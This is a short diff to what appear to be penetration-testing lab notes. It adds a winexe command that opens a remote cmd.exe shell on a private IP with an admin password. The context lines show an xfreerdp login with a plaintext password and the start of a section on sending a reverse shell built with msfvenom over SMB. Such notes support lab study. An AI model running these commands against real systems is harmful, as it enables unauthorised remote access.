@@ -6,6 +6,12 @@
 xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.34.38
 ```
 
+### Connecting with winexe
+
+```text
+winexe -U 'admin%password' //10.10.107.212 cmd.exe
+```
+
 ### Making SMB Server to send Rev-shell
 
 Generate a reverse shell executable \(reverse.exe\) using msfvenom.
